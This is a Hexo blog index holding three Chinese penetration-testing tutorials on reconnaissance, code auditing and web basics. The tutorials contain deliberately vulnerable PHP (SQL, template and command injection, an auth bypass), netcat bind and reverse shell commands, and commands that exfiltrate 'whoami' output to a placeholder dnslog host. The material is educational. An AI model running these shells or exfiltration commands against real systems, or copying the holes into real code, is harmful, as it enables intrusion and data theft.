{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"https://ink-scholar.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-11-24T07:16:07.600Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"/404.html","permalink":"https://ink-scholar.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-11-24T07:16:07.610Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"about/index.html","permalink":"https://ink-scholar.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"分类","date":"2023-11-24T07:40:53.199Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"categories/index.html","permalink":"https://ink-scholar.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-11-24T07:16:07.619Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"books/index.html","permalink":"https://ink-scholar.github.io/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-11-24T07:17:50.043Z","updated":"2022-03-21T07:18:46.000Z","comments":true,"path":"links/index.html","permalink":"https://ink-scholar.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-11-24T07:16:07.646Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"repository/index.html","permalink":"https://ink-scholar.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-11-24T07:18:08.372Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"tags/index.html","permalink":"https://ink-scholar.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"渗透测试--信息搜集","slug":"渗透测试--信息搜集","date":"2024-01-02T15:55:32.430Z","updated":"2024-01-21T13:40:09.720Z","comments":true,"path":"2024/01/02/渗透测试--信息搜集/","permalink":"https://ink-scholar.github.io/2024/01/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","excerpt":"","text":"大部分就是利用一些在线的威胁情报网站，很多技巧都集合在一些工具里，一般几乎都是傻瓜式的操作 业务资产企业信息 名称 地址 小蓝本 https://www.xiaolanben.com/ 企查查 https://www.qcc.com 国外企查 https://opencorporates.com 爱企查 https://aiqicha.baidu.com/ 以上的查询其实就是输入一个公司名，然后会得到和企业相关的结果，如果网站收费，可以去咸鱼拼多多等地方买会员 关注点除了域名之外，还有APP和微信公众号等 根据以上查询的结果归结为以下五种应用，然后对每一种应用类型进行更加细致的信息搜集 Web应用web单域名通过备案信息获取 名称 地址 备案信息查询 http://www.beianx.cn/ 备案管理系统 https://beian.miit.gov.cn/ 先输入公司名称，然后根据列出的备案号，重新输入备案号 “-” 前的部分，继续查询 通过企业产权获取和企业信息查询方式一致 通过注册域名获取通过域名注册的网站查询，比如在腾讯云，输入之前获取到的域名信息，看看哪些域名被注册了，当然这只是个思路，并不能保证准确性，当然也很可能，这个公司注册了，但是并未投入使用，如果有业务在上面的话，就有扩展了攻击面 通过反查解析获取通过IP地址反查 名称 地址 微步在线 https://x.threatbook.cn/ 在线同IP网站查询工具 http://dns.bugscaner.com/ web子域名DNS数据 名称 地址 dnsdumpster https://dnsdumpster.com/ 证书查询https的站点可以直接看到证书，通过证书匹配子域名，通过以下网站或者网络空间搜索引擎cert语法 名称 地址 CertificateSearch https://crt.sh/ 网络空间根据子域名查询语法查询，比如fofa的domain&#x3D;”” 名称 地址 FOFA https://fofa.info/ 全球鹰 http://hunter.qianxin.com/ 360 https://quake.360.cn/quake/ 零零信安（只能国内） https://0.zone/ Shodan（国外） https://www.shodan.io/ Censys（国外） https://censys.io/ 威胁情报 名称 地址 微步在线 https://x.threatbook.cn/ 奇安信威胁情报中心 https://ti.qianxin.com/ 360威胁情报中心 Https://ti.360.cn/#/homepage 枚举解析可以通过在线平台的接口查（不推荐） 工具推荐oneforall，把上述的方法查不多做了一个结合，通过api接口调用，不过现在这个工具也存在各种各样的问题，可以自己对代码进行一下魔改 web架构指纹识别 名称 地址 TideFinger潮汐指纹 http://finger.tidesec.net/ 云悉指纹 https://www.yunsee.cn/ Wapplayzer https://github.com/AliasIO/wappalyzer 当然，有时候很容易会出现误报，需要自己甄别 工具gotoscan适合在不出网环境中使用 源码获取开源直接搜索获取，然后对比一下网站访问情况来确定是否正确 闭源源码不能直接获取是很正常的情况，可以看网站是否存在一些配置不当问题造成的源码泄漏 以下五种是比较常见的情况 git源码泄漏在执行 git init 初始化目录时，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码时，如果没有把 .git 目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码，可以在网站后加上 .git&#x2F; 看看目录是否存在 通过工具：GitHack 来实现（ https://github.com/lijiejie/GitHack ） svn源码泄漏原理上和git泄漏差不多，判断方式直接在网站后面加上 .&#x2F;svn&#x2F; 看看是否存在即可 通过工具：SvnHack-master 来实现 使用时 -u 指定url时，格式为 url&#x2F;.svn&#x2F;entries ，后面加上 – download 即可下载 网站备份压缩文件可以通过目录扫描工具进行尝试 DS_Store文件泄漏是Mac下Finder用来保存如何展示文件或文件夹的数据文件，每个文件夹下对应一个，如果将它上传至服务器，可能造成目录结构泄漏 通过工具：https://github.com/lijiejie/ds_store_exp 来实现 composer.json类似于版权文件的介绍，php中使用 其他方向识别出大致信息却无法下载访问网站，查看加载文件，选取一些看着比较有特点的脚本文件、js文件等，然后去github等网站去搜索这个文件，查看结果 未识别出信息使用码云资源获取有时通过工具扫描，可以扫出一些特征信息，比如开发者的邮箱，可以通过github等平台去尝试搜索 其他行业开发使用对口资源站获取比如互站网 JS前端架构什么是JS渗透测试在javascript中也存在变量和函数，我们可以通过浏览器查看源代码获取真实的点，获取url、敏感信息。一般会在JS中寻找更多的URL地址，JS代码逻辑（加密算法、APIkey，验证逻辑） JS安全问题源码泄漏、未授权访问、敏感key泄漏、API接口安全 流行的JS框架Vue、NodeJS、JQuery、Angular 手动分析当确定为js框架后，访问页面刷新，F12查看加载的JS文件，寻找名字有意义的js文件，如login.js 也可以直接搜索，搜索内容可以是如下： src&#x3D;，path&#x3D;，method:”get”，http.get(“，method:”post”，http.post(“，$.ajax，service.httppost，service.httpget 大部分地址的代码需要追踪分析 半自动分析结合burp，访问，在Target–Site map中找到网站地址，右键，Engagement tools–Find scripts，即可 可以用burp官方插件，JS Link Finder和JS Miner 也可以用第三方的，推荐HaE（知道创宇404开发）（ https://github.com/gh0stkey/HaE ） ， Unexpected_information（ https://github.com/ScriptKid-Beta/Unexpected_information ） 全自动浏览器插件：findsomething（一个熊猫头） 脚本工具：JSFinder（不推荐用），URLFinder（jsfinder升级版，更好用一点）（ https://github.com/pingc0y/URLFinder ） 但是有些js文件我们并不能直接在前端分析出路径，比如登陆后加载的js文件，这时候我们需要Fuzz一下，推荐工具 ffuf ，使用这个工具需要fuzz字典，字典下载地址：https://wordlists.assetnote.io 另一个是针对Webpack等前端打包工具所构造的网站进行一个扫描，Packer-Fuzzer ，大部分前端都会用到Webpack 中间件Web服务器判断方法有很多，比如从响应头的Server信息，Apache、Nginx、IIS、lighttpd，Web服务器主要用于提供静态内容，如HTML、CSS和JavaScript等，以及处理对这些内容的HTTP请求。Web服务器通常使用HTTP协议来与客户端通信，以便在浏览器中呈现网页。 应用服务器Tomcat、Jboss、Weblogic、Websphere，相比于web服务器，他们的特点是有特定端口服务的开放，所以应用服务器的探测要用到端口扫描，通过Server信息一般很难看到，应用服务器主要用于提供动态内容，如数据库查询和Web应用程序逻辑等，通常与Web服务器协同工作。应用服务器通常使用专有协议与客户端通信，以便执行更复杂的操作和提供更高级的功能。 扫描工具：nmap、masscan 被动扫描：利用网络空间搜索引擎。fofa等 端口扫描还可以扫其他的服务，比如数据库mysql、sqlserver、oracle、redis、mongodb，操作系统linux、windows等 有一种现象需要注意，比如一个web搭在了内网，然后把web端口转到了外网，这时你只能扫外网ip，你可以扫到web服务，但是如果内网中开启了比如mysql且没有转到外网，这样你是扫不到的，但是web本身用到了mysql，这是一种现象 Waf识别web应用防火墙，云waf、硬件waf、软件waf、代码级waf这些，识别的话可以看一下他们的拦截页面，identywaf项目内置了一些拦截页面，当然也可以使用自动的工具。推荐工具 wafw00f ， identYwaf。除此之外，还可以使用fofa等直接查域名即可 蜜罐识别是一种安全威胁的检测技术，本质在于引诱和欺骗攻击者，并通过记录攻击者的攻击日志来产生价值 根据蜜罐与攻击者之间进行的交互程度，分为低、中、高交互蜜罐 识别工具：360quake（ https://github.com/360quake/quake_rs ） ， 当然，也是用网络空间搜索引擎来识别的 一般情况下，使用web去访问一些蜜罐端口会出现下载的情况，比如蜜罐开启了mysql应用，然后我们去爆破它，蜜罐就会记录攻击者的账号密码，账号密码会采用web jsonp去传输，当你http协议访问，就会被下载，说到底蜜罐这些功能服务还是使用web功能来实现的 CDN配置加速域名（子域名获取真实IP）、加速区域（全球ping）、加速类型（证书） 当然以上方法和配置有关 判断是否存在多地区ping，看一下IP是否相同，若不同，则使用了CDN，使用网站：17ce.com、ping.chinaz.com 如果你怀疑某个ip是否是这个域名的真实ip，可以将这个ip和域名写入hosts文件，然后访问域名，若成功，则是 绕过CDN主动寻找&amp;遗留文件除了上诉这些子域名等方法，还可以尝试一些主动漏洞或者遗留文件，如ssrf，让站点来主动访问我们，可以用dnslog平台来记录站点的ip，当然如果网站存在像远程加载图片这种功能，同样可以利用这种方法，让网站主动来访问我们，然后记录下ip地址；遗留文件如phpinfo这种配置文件，也可能会 邮件系统有两种情况，第一种就是邮件系统做不了CDN，因为邮件系统记录类型通常为MX，这种记录类型一般无法设置CDN 第二种情况其实也是主动寻找，就是它主动给我发邮件，然后查看显示邮件原文即可看到真实ip 常见的邮件触发点有：RSS订阅、邮箱注册激活、找回密码、邮件推送、邮件通知等 不过在收到邮件时要先看一下发件人，是否是使用了他们自己的邮件服务器，因为有可能是代发，使用如126这种其他的邮箱代发 还有一种骚操作：首先你自己用vps搞个邮箱服务器，然后你发送邮件到一个不存在的邮箱地址，因为该用户不存在，所以发送失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知，不过如果对方设置了一些策略，比如任何邮件地址都可以投递成功这种，这种方法就失效 这里必须用自己的邮件服务器，如果你用比如QQ邮箱去发送，这样投递失败的话，错误信息会先发给QQ，然后QQ在发给我，这样得到的ip其实是QQ的 在线网站接口查询https://get-site-ip.com/ 国外接口，输入域名直接返回真实ip，不过效果的话就要看运气了 https://fofa.info/extensions/source fofa可以查，不过要花钱，如果查国外的话，效果还不错，但是如果查国内站点，效果属实一般甚至没啥效果（法律风险） 全网扫描一般步骤为判断加速厂商（ https://tools.ipip.net/cdn.php ） ， IP库筛地址段（ https://cz88.net/geo-public ） ， 配置范围扫描（工具 fuckcdn） 就是先判断厂商，比如是阿里云，然后再去库里面筛选阿里云的ip地址段，然后将这些ip段加入到工具里，再把网站的关键词加到工具里，然后开扫 这个工具会先从ip段扫描符合开放的端口，再去页面找之前设置的关键字，然后返回结果，不过如果站点不支持ip访问，那就不行了 这时候换另一个工具： Bypass_cdn 框架组件Python开发框架Django可以用插件识别，数据包中一般存在Set-Cookie:csrftoken&#x3D; Flask插件识别，数据包中一般会出现flask PHP开发框架ThinkPHP插件识别，数据包中带有ThinkPHP，网站的图标识别，还有很多是用thinkPHP二次开发 Laravel插件识别，数据包特征 Yii插件识别，数据包特征 JAVA组件52类110个主流的JAVA组件 https://blog.csdn.net/agonie201218/article/details/125300729 Fastjson&#x2F;JacksonFastjson可以将Java对象和json格式字符串之间相互转换 在提交json数据包中修改测试，Fastjson组件会把01解析成1，Jackson组件在解析01时会抛出异常 https://forum.butian.net/share/1679 Shiro执行身份验证、授权、密码和会话管理 请求包的cookie中存在rememberMe字段，返回包中存在set-Cookie: rememberMe&#x3D;deleteMe。请求包中存在rememberMe&#x3D;x时，响应包中存在rememberMe&#x3D;deleteMe。有时候服务器不会主动返回rememberMe&#x3D;deleteMe，直接发包即可，将Cookie内容改为rememberMe&#x3D;1，若响应包有rememberMe&#x3D;deleteMe，则基本可以确定网站是apache shiro搭建的 Struts2一般使用此框架后缀带do或action，可以尝试进行利用 Springboot默认报错页面 还有他的默认图标，一个绿色的叶子，icon_hash&#x3D;116323821 Solar一般开放8983端口 APP应用获取APP名称获取1、爱企查–知识产权 2、七麦( https://qimai.cn )、点点( https://app.diandian.com )、小蓝本、豌豆荚查名称 URL网站备案获取1、备案信息查询 2、网站上有APP下载 3、应用市场直接搜单位名称 获取资产信息抓包假设一个场景，我们打开APP时，开启抓包但是没有数据，点击登录这个功能时抓到了包，得到了一个网址，但是这个网址在反编译后并没有得到 原因就是登录界面是APP打包的资源，并没有对外发送数据，而反编译也是一个静态分析的过程，所以我们还要进行一个动态的分析 但是如果我们打开APP时就有数据包，那通过静态分析能得到数据吗？ 那也不一定，因为APP可能会对这些网址进行加密处理，一般的静态分析工具通过正则不一定可以匹配的到 这是一个动态分析的过程，但是我们在模拟器中抓包，肯定是抓不全的，和代理证书有关，不过可以借助下面的MobSF平台来实现动态调试 提取使用一些工具和在线的平台 MobSF(自己手动搭建，可以动态和静态分析，推荐，https://github.com/MobSF/Mobile-Security-Framework-MobSF )、AppInfoScanner( https://github.com/kelvinBen/AppInfoScanner ，推荐) MobSF在进行动态调试时，需要在本地安装一个模拟器，比如逍遥模拟器即可 小程序应用获取在各大平台（微信、支付宝等）搜索 小程序抓包在基础篇提到过，就是burp和proxifier的联动 小程序结构主体一个小程序的主体部分由三个文件组成，必须放在项目的根目录，如下 app.js — 必须要有，是小程序的逻辑 app.json — 必须要有，是小程序的公共配置 app.wxss — 不是必须的，是小程序的公共样式表 页面页面由四个文件组成 xxx.js是页面逻辑，xxx.json是页面配置，xxx.wxml是页面结构，xxx.wxss是页面样式 目录结构pages 页面文件夹， index 首页， logs 日志， util 工具类（mina框架自动生成）， app.js 入口js（类似于java类中的main方法）、全局js， app.json 全局配置文件， app.wxss 全局样式文件， project.config.json 跟你在详情中勾选的配置一样， sitemap.json 用来配置小程序及其页面是否允许被微信索引 小程序逆向推荐个工具 http://xcx.siqingw.top ，目前只能在windows x86和x64 架构运行，具体操作方法网站上都有，这里大致说一下 这个工具在反编译小程序分两部分，选择解包文件和刷新反编译包，解包文件地址为小程序的目录地址，在电脑端的微信点击微信—文件管理，打开文件路径后回到它的上一级，选择Applet文件夹，可以把所有文件夹删掉，然后访问一下你想逆向的小程序，这个目录下面就会出现这个小程序的文件夹，这个就是你要解包的文件地址，选择里面的 .wxapkg文件即可，如果有多个.wxapkg文件，全选即可，不过要将__APP__.wxapkg放在第一个，解包后点击刷新反编译包即可，之后在操作区点击新版反编译，然后就可以在指定目录看到结果 之后使用微信官方的微信开发者工具，将刚刚反编译后的源码导入，即可进行调试，如果js加载有保存导致页面无法正常显示，可以在右上角的详情—本地设置—将JS编译成ESS的勾选给去掉，即可，将可视化打开，通过点击右侧的代码文件，左侧的可视化界面就会随之跳转 之后我们就可以先简单测试一下未授权访问之类的信息，比如小程序需要先登录，但是我们本地打开后访问一些文件，成功了就是未授权，或者在源码里搜索Accesskey之类的关键字，后面会详细讲解 公开平台微信公众号获取https://weixin.sogou.com ，查询成功后看下有无第三方服务 Github监控人员、域名、邮箱等筛选，如xxx.cn password in:file 更多搜索规则可以自行查阅 关键字配合谷歌搜索： site:Github.com smtp @qq.com site:Github.com smtp password site:Github.com String password smtp 长期监控https://github.com/madneal/gshark ，https://github.com/Explorer1092/Github-Monitor 网盘搜索可以在百度网盘之类的直接搜索，也可以找一些接口 邮箱搜集https://hunter.io/ 信息搜集–工具集合先推荐个地址：https://github.com/guchangan1/All-Defense-Tool F8xhttps://github.com/ffffffff0x/f8x ，一款自动化部署工具 ENScan针对于企业信息查询，在配置文件中自己配置一些cookie和token即可 AsamF集成了fofa、hunter、quake、zoomeye等平台，只需要在配置文件中把key配置好即可使用，优点就是hunter和quake导出是要花费积分的，使用这个工具可以免费导出，配置key的作用在于你的查询权限，如果你在平台上只能查询第一页，那就只能导出第一页 ARL灯塔https://github.com/TophantTechnology/ARL ，可以搜一下ARL魔改版的搭建，把指纹库之类的加了进去 Nemohttps://github.com/hanc00l/nemo_go","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"信息搜集","slug":"信息搜集","permalink":"https://ink-scholar.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"}]},{"title":"代码审计概述","slug":"代码审计概述","date":"2023-12-17T12:43:25.221Z","updated":"2023-12-18T16:55:32.866Z","comments":true,"path":"2023/12/17/代码审计概述/","permalink":"https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"先来一张图 术：漏洞利用的工具使用，什么代码、什么框架用什么工具；遇到什么站拿什么打（骚操作、技巧） 用：漏洞的挖掘思维，代码的审计思维，安全开发的思维（某一个门类的共性） 体：安全核心，安全思维，漏洞产生的根本原因，漏洞的抽象共性（整个安全的底层基础） 即 一线技巧 –》 思考者 –》 安全本质 个人觉得说的很好，深有感触 安全的本质信任问题！ 一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须要有一些最基本的假设，安全方案才能得以建立。反之，如果我们否定一切，安全方案就会变成无源之水、无本之木，无法设计，也无法完成。 是否该信任普通用户的输入？（前台漏洞） 是否该信任管理员用户的输入？（后台漏洞） 是否该信任升级包、离线升级、在线升级、自动化升级？（供应链攻击） 不信任任何输入？（信任了输入的检测逻辑） 安全方案模型所有的安全模型，都可以简化成一种最简易的模型：输入&#x3D;&#x3D;》检测是否有安全风险&#x3D;&#x3D;》输出 为什么是输入？？所有的输入都是恶意的：入侵检测理论的名言 我们能掌控的只有输入：我们挖掘漏洞最好的入口点，也是也只能从输入去入手 在整个代码审计的过程中，一定要紧紧抓住输入，结合不同语言的特点，跟踪传播链条是否有可疑点 程序希望用户输入什么控制流与数据流看两段代码 1234567&lt;html&gt; &lt;body&gt;Hello my name is :&lt;?phpecho $_GET[&quot;name&quot;];?&gt; &lt;/body&gt;&lt;/html&gt; 1234567&lt;html&gt;&lt;script&gt;console.log(Hello my name is :&quot; + &quot;&lt;?phpecho $_GET[&quot;name&quot;];?&gt;&lt;/script&gt;&lt;/html&gt; 将代码分成两部分，一部分是控制代码走向的控制流代码，另一部分是用来被展示、被存储、被流转的数据流代码（包括输入数据、程序员本来就硬编码的数据） 程序员希望用户输入的一定数据流而不是控制流 一旦我们 输入的数据 能够以某种方式侵入到控制流时，漏洞就产生了 如下 sql注入12345&lt;?php$db = init_db();$username = $_GET[&#x27;username&#x27;];$db-&gt;query(&quot;select * from table where username = &#x27;$username&#x27;&quot;); ?&gt; 我们看一下输入到流转： 输入 –》 php字符串变量 –》 sql语句 –》 数据库 在数据库层面，控制流是sql语句，原本这段代码的本意是： 123456action：selectobject：tablesubject：*condition： key：username value：$username 代码保证用户的输入只能影响结构中的value位置，如果不能保障，就会出现漏洞 比如我们输入：admin’ and 1&#x3D;1# 123456789action：selectobject：tablesubject：*condition： expression：and key1：username value1：$username key2: 1 value2: 1 我们在代码层（PHP）的输入，导致了数据库（mysql）层的数据流入侵到了控制流 SSTI服务端模版注入 Twig是php的一套模板渲染的组件，但是不规范的渲染参数输入方式，可能导致模板注入 1234567&lt;?php require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); echo $output;?&gt; 以上这段代码是正确的，没有产生漏洞的，我们来看一下输入流转： 输入–》php字符串变量$_GET[“name”]–》Twig模板渲染–》发现变量–》找到变量name的绑定–》解析字符串–》渲染展示 我们再看一下错误的写法 1234567&lt;?php require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;); echo $output;?&gt; 再看一下输入流转： 输入–》php字符串变量$_GET[“name”]–》拼接字符串”Hello {$_GET[‘name’]}”作为新变量–》Twig模板渲染–》渲染展示 我们在代码层（php）的输入，导致了Twig模板层的数据流入侵到了控制流 命令执行1234&lt;?php$domain = $_GET[&quot;domain&quot;];echo system(&#x27;tracert &quot;&#x27;.$domain.&#x27;&quot;&#x27;)?&gt; 这个代码其实就是tracert命令 程序原意是在 bash程序 中 1234execute： process: exe: tracert --&gt; /bin/tracert arg: $domain 此时，程序必须保证用户的输入只能影响到arg位置，如果不能保障，则会产生漏洞 比如输入： 1baidu.com&quot;;whoami;echo &quot;fuck qax 此时代码里的拼接为 1tracert &quot;baidu.com&quot;;whoami;echo &quot;fuck qax&#x27; 此时代码执行的逻辑为 1234567891011execute： process1: exe: tracert arg: &quot;baidu.com&quot; or--&gt; process2: exe: whoami arg: - or--&gt; exe: echo arg: &quot;fuck qax&quot; 我们在代码层（php）的输入，导致了bash程序层的数据流入侵到了控制流 业务流程问题很多逻辑漏洞、越权漏洞，往往来源于此，也是现代mvc结构出现比较多的问题。（现代mvc结构一般不会出现sql注入[预编译解决]、xss[前端框架解决]、webshell上传[java，python这种网站或者oss存储]） 过度信任用户输入业务功能：输出当前用户信息 123456&lt;?php$user_id = int($_GET[&#x27;user_id&#x27;]);$db = init_db();$data = $db-&gt;query(&quot;select * from user where user_id = $user_id&quot;);echo parse_user_profile($data);?&gt; 这是一个典型的越权读取模型，虽然没有sql注入问题，但是在业务逻辑上的校验有漏洞，信任了用户输入的user_id 不信任用户输入–即信任检测逻辑123456789101112131415161718192021222324252627282930313233//login.php&lt;?phpsession_start();header(&quot;content-type: text/html; charset=utf-8&quot;);$password = &quot;test&quot;;$_SESSION[&#x27;is_login&#x27;J = 0;if ($_GET[&#x27;password&#x27;] == $password)&#123; $_SESSION[&#x27;is_login&#x27;] = 1; $_SESSION[&#x27;user_id&#x27;] = $_GET[&quot;user_id&quot;]; // 假定管理员user_id=。 header(&quot;location: /user.php?is_login=l&quot;); exit();&#125;else&#123; echo &quot;密码错误&quot;； exit();&#125;?&gt;// http://192.168.215.129/login.php?password=test&amp;user_id=123//user.php&lt;?phpsession_start();header(&quot;content-type: text/html; charset=utf-8&quot;);if ($_SESSION[&#x27;is_login&#x27;] == $_GET[&#x27;is_login&#x27;])&#123; echo &quot;你登录了&quot;; if ($_SESSION[&#x27;user_id&#x27;] == 0)&#123; echo &quot;你是管理员&quot;; &#125;else&#123; echo &quot;你不是管理员&quot;; &#125;&#125;else&#123; echo &quot;没登陆&quot;;&#125;?&gt; 这是一个经典的逻辑绕过漏洞，在整个流程中，开发者完全没有信任用户的输入。 对密码进行了校验，校验通过才存session，并且用户id也是存储于session中的，没法通过cookie伪造绕过鉴权。 不信任任何输入–》对输入进行检测（实际上就是把信任关系绑定到了对输入检测逻辑上，那么一旦输入检测逻辑出现问题，信任关系被打破，就出现了漏洞） php是弱类型语言，在php中，NULL &#x3D;&#x3D; false &#x3D;&#x3D; 0 &#x3D;&#x3D; “” 所以上面的代码中，我们什么都不输入，就可以绕过检测 用体-用-术看待问题盗张图 切记！！！紧紧抓入输入，即能否让数据流逃逸到控制流，你的输入能否在业务逻辑上产生问题，如何根据污点分析快速筛选出有问题的业务","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"渗透测试--基础入门","slug":"渗透测试--基础入门","date":"2023-12-14T14:33:04.392Z","updated":"2024-01-02T15:19:58.320Z","comments":true,"path":"2023/12/14/渗透测试--基础入门/","permalink":"https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/","excerpt":"","text":"此篇主要写一点和web相关的基础知识，随便写写，不成系统 Web环境常规知识web应用系统常见的三种搭建方式：子域名、端口、目录三种方式 其他方式还有类似于博客园这种分配站的形式 网站数据库站库分离，现在常见的类型是云数据库RDS，安全性更高 对象存储OSS：只存储不解析，修复上传安全，但是存在Accesskey隐患 开源源码–源码可见&#x2F;源码不可见（加密，语言特性） 加密一般网上有对应的，比如asp、php加解密网站 语言特性比如java代码，从服务器上拖下来是一些class文件，此时需要反编译 路由访问：url和文件目录对应不上很正常，要根据配置路由决定 前后端分离：前端JS框架，API传输数据；前端页面大部分不存在漏洞，而后端管理大部分不在同域名，因此获得权限有可能不影响后端 类似于宝塔的打包类集成化环境，文件管理会锁定目录，命令无法执行，和权限有关 Docker容器：虚拟化技术， 独立磁盘空间，非真实的物理环境；因此衍生出docker逃逸，以后会写 WAF: CDN：内容分发服务，提高访问速度，可隐藏真实源IP 反向代理： 正向代理为客户端服务，客户端主动建立代理访问目标（不代理不可达） 反向代理为服务端服务，服务端主动转发数据给可访问地址（不主动不可达） 因此你的访问目标只是一个代理，而非真实的应用服务器 正向代理和反向代理都是解决访问不可达问题，由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实的应用没有关系 负载均衡：分摊到多个操作单元上进行执行，共同完成工作任务；有多个服务器加载服务，测试过程中存在多个目标情况 在宝塔中可以如下进行配置： 12345678910# 定义负载设置upstream fzjh&#123; server 1.1.1.1:80 weight=2; server 2.2.2.2:80 weight=1;&#125;# 定义访问路径和策略location / &#123; proxy_pass http://fzjh/;&#125; APP&#x2F;小程序应用开发架构： 1、原生开发 安卓一般用java开发，也有kotlin语言开发，效率和功能是最好的，难度也是最大的 2、H5开发 使用HBuilder X，一般就是H5➕Vue，会存在API和JS框架安全问题 3、使用flutter开发 谷歌推出的一款UI框架，使用dart语言开发，支持跨平台，weight渲染直接操作硬件层，但是技术比较新，生态还不完善 4、常规web开发 就是开发一个网站，然后加入app的壳。web app 一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所有反应速度慢，内容加载过多容易卡死。 Web常规命令基础推荐个网站：https://forum.ywhack.com/bountytips.php 在里面填一些基本信息会将命令显示出来 文件上传下载： Linux：wget，curl，python，ruby，perl，java等 Windows：PowerShell，Certutil，Bitsadmin，msiexec，mshta，rundll32等 反弹shell： 正向连接：即自己主动找别人，如Linux控制windows正向连接 在windows上绑定cmd到本地5566端口 1nc -e cmd -lvvp 5566 然后Linux主动连接windows的5566端口 1ncat ip 5566 同理，windows控制Linux的话，在Linux上执行 1ncat -e /bin/sh -lvvp 5566 在windows上执行 1nc ip 5566 反向连接：即别人主动来找我，我自己监听，如windows等待Linux反向连接 在Windows上执行 1nc -lvvp 5566 在Linux上执行 1ncat -e /bin/sh windows的ip windows本地正在监听的端口 管道符： Windows：| &amp; || &amp;&amp; Linux：; | || &amp; &amp;&amp; &#96;&#96; 用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行 管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推，显示后面语句的执行结果 &amp;放在启动参数后面表示设置此进程为后台进程 只有在 &amp;&amp; 左边的命令返回真，&amp;&amp; 右边的命令才会被执行 只有在 || 左边的命令返回假，|| 右边的命令才会被执行，只要有一个命令返回真，后面的命令就不会被执行，即一直到返回真的地方停止执行 数据回显：除了上面的反弹shell方法，还可以外带数据查询，比如使用dnslog平台，ping `whoami`.xxx.dnslog.cn，如果有命令执行那就会看到whoami的执行结果。当然 ``仅限于Linux，如果遇到Windows的话，可以使用powershell 1powershell $a=whoami;$a=$a.replace(&#x27;\\&#x27;,&#x27;rce&#x27;);$b=&#x27;.xxxxx.dnslog.cn&#x27;;$c=$a+$b;ping $c 为什么在windows下这么复杂？因为windows下cmd无法直接使用管道符去解析whoami，所有要使用powershell变量赋值，把whoami执行结果给到变量，但是ping的结果中带有 \\ ，所有加个replace去替换 抓包基础HTTP&#x2F;HTTPS协议charles（茶杯）、Fiddler、burp，怎么安装使用网上一大堆，这里不多赘述。 抓微信小程序：可以使用charles抓包，然后转给burp分析；还可以使用proxifier 个人推荐使用proxifier，打开后在代理服务器中选择https，地址与端口和burp的保持一致，然后在代理规则中的应用程序输入wechat*.exe即可，这是在Windows上的方法，如果用mac的话，应用程序那里可以点 + 号 然后在Applications那里，搜索应用，如微信小程序 这个Mini Program 就是小程序的执行程序 PC应用：和抓微信小程序一样，也是用 proxifier➕burp 即可 其他协议推荐工具：科来（没有mac版本，适合新手）、Wireshark 模拟器的一些游戏抓取可以用一个封包监听工具，下载地址和使用说明可以去b站看看 https://www.bilibili.com/video/BV19a411s7pf/?pop_share=1&amp;vd_source=f0e85cdc73190cf042eeba2be6dba3cb 编码算法加密基础加密&amp;编码单向散列加密代表有 MD5 ，常见的还有 SHA ， MAC ， CRC 优点：方便存储，损耗低，加密对性能的损耗微乎其微 缺点：存在暴力破解的可能性，因此最好通过 加盐 的方式提高安全性，此外可能存在散列冲突 MD5密文特点：由数字0-9和字母a-z组成，固定位数16位或32位 解密需求：知道密文即可，对于复杂明文很难碰撞出来 base64编码 一般情况下密文尾部回忆两个等号&#x3D;&#x3D;，明文很少的时候则没有 